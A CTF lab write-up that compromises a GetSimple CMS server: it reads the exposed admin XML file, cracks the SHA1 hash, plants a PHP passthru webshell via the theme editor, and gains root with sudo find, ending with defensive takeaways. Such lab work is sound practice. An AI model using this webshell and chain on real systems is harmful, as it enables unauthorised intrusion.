---
layout: post
title: "Hidden CMS Breach - GetSimple Unauthenticated Leak to RCE"
description: "CTF writeup exploiting a GetSimple CMS 3.3.16 info disclosure to extract admin credentials, then RCE via theme editor webshell and privesc with sudo find."
category: hackerdna
tags: [web, ctf, hackerdna, getsimple-cms, cms, information-disclosure, rce, theme-editor, webshell, sudo, privesc, gtfoBins]
---

## Hidden CMS Breach - CTF Writeup

**Category:** WEB | **Flags:** 2 (User + Root)

Challenge: [https://hackerdna.com](https://hackerdna.com)

## Contents

- [Reconnaissance](#reconnaissance)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)

## Reconnaissance

Nmap scan reveals a single open port:

- **80** - HTTP (nginx 1.24.0)

The web page displays a simple ASCII art welcome banner with mission instructions:

```text
Target: this server
Your mission:
  [1] Your mission starts here
  [2] Obtain the user flag located in this server at /home/flag_user.txt
  [3] Escalate privileges to root access
  [4] Capture the root flag at /root/flag_root.txt
```

Checking `robots.txt` reveals critical information:

```text
# Hostname: http://getsimple.hdna
User-agent: *
Disallow: /new_website/
```

The hostname `getsimple.hdna` strongly hints at **GetSimple CMS**. The `/new_website/` directory is blocked from crawlers but accessible directly. Fuzzing confirms the admin panel at `/new_website/admin/`:

```bash
curl -s http://TARGET/new_website/admin/
# GetSimple CTF - Login Page (v3.3.16)
```

## Exploitation

### Step 1 - Information Disclosure (CVE-2014-8722)

GetSimple CMS 3.3.16 is vulnerable to **CVE-2014-8722** — an information disclosure that exposes user data and API keys via direct file access without authentication. The admin's password hash is stored at `/data/users/<username>.xml`:

```bash
curl -s http://TARGET/new_website/data/users/admin.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<item>
  <USR>admin</USR>
  <PWD>34391d961419bb65a1e8e2bb7f95581f35971238</PWD>
  <EMAIL>admin@getsimple.hdna</EMAIL>
  <HTMLEDITOR>1</HTMLEDITOR>
  <TIMEZONE></TIMEZONE>
  <LANG>en_US</LANG>
</item>
```

### Step 2 - Crack Password Hash

The extracted hash `34391d961419bb65a1e8e2bb7f95581f35971238` is a raw SHA1. Using John the Ripper with a common password wordlist:

```bash
echo '34391d961419bb65a1e8e2bb7f95581f35971238' > /tmp/hash.txt
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
```

```
1234yellow       (?)
```

**Admin credentials:** `admin` / `1234yellow`

### Step 3 - Login and Theme Editor RCE

Log in to the admin panel and navigate to the **Theme Editor** (`theme-edit.php`). The Innovation theme's `template.php` is editable. Inject a PHP webshell at the top of the file:

```php
<?php if(isset($_REQUEST['cmd'])){passthru($_REQUEST['cmd']);}?>
```

Save via POST with the CSRF nonce:

```bash
curl -s -X POST "http://TARGET/new_website/admin/theme-edit.php?t=Innovation&f=template.php" \
  -b cookies.txt \
  -d "nonce=NONCE_VALUE&content=PAYLOAD&edited_file=Innovation/template.php&submitsave=Save+Changes"
```

Execute commands through the injected webshell on the main site:

```bash
curl -s "http://TARGET/new_website/index.php?cmd=id"
# uid=100(nginx) gid=101(nginx) groups=82(www-data),101(nginx),101(nginx)
```

### Step 4 - User Flag

```bash
curl -s "http://TARGET/new_website/index.php?cmd=cat%20/home/flag_user.txt"
# 9688df73-41f4-4899-bac2-2753dd45ba79
```

**User Flag:** `9688df73-41f4-4899-bac2-2753dd45ba79`

## Privilege Escalation

### Sudo Enumeration

Running `sudo -l` reveals a NOPASSWD sudo rule for the `find` binary:

```bash
curl -s "http://TARGET/new_website/index.php?cmd=sudo%20-l"
# User nginx may run the following commands on ip-10-0-1-65:
#     (root) NOPASSWD: /usr/bin/find
```

### GTFOBins - find

The `find` binary can be abused to spawn a root shell or execute arbitrary commands as root. Using the `-exec` flag:

```bash
curl -s "http://TARGET/new_website/index.php?cmd=sudo%20find%20.%20-exec%20cat%20/root/flag_root.txt%20%5C;%20-quit"
# b114d2e4-512b-4eae-8350-d2e47047d65e
```

**Root Flag:** `b114d2e4-512b-4eae-8350-d2e47047d65e`

## How the Attack Works

GetSimple CMS 3.3.16 is vulnerable to **CVE-2014-8722**, an unauthenticated information disclosure. The admin user database lives in XML files under `/data/users/`, and the vulnerable build served those files directly to anyone who requested the path — no session or authentication required. The XML stored the admin password as an **unsalted SHA1** hash, which makes it trivial to brute-force with a wordlist like `rockyou.txt`; `john --format=raw-sha1` recovered the plaintext `1234yellow` almost instantly because unsalted fast hashes can be computed billions of times per second.

The second stage uses a standard CMS feature as the entry point. GetSimple's **Theme Editor** lets administrators edit template PHP files and saves them to disk. Logged in with the cracked credentials, injecting `passthru()` into `template.php` turns a cosmetic editor into a persistent web shell served from the main site.

## Key Takeaways

- **Never store passwords as unsalted fast hashes.** Use a slow, salted password hash (bcrypt, scrypt, Argon2id). An unsalted SHA1 hash of a weak password survives milliseconds against a GPU cluster.
- **Update CMS software.** CVE-2014-8722 was patched in 2014; running a version from a decade ago guarantees known-disclosure and RCE chains.
- **Treat "legitimate" admin features as attack surface.** Theme editors, plugin installers, and file managers that write to the webroot are RCE when credentials are weak.
- **Combine file disclosure with user information.** The `robots.txt` hint (`/new_website/` and the `getsimple.hdna` hostname) plus the leak is a realistic recon-to-root chain: enumerate, read config, crack a hash, execute.
